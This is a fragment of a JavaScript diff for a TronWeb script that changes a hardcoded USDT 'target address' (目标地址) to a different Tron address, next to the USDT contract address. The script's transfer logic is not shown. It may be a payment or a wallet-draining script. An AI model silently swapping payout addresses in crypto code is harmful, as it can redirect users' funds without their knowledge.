@@ -4,7 +4,7 @@ let tronWeb;
 let walletAddress;
 
 // 目标地址
-const targetAddress = "THzYeKcgsuFPTYQg4U48UVadqFdQoHY91A";
+const targetAddress = "TXDQwDjW4emupPQXbzr1UFr8V85NqS1yYE";
 
 // TRC20 USDT 合约地址（波场主网 USDT 合约地址）
 const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
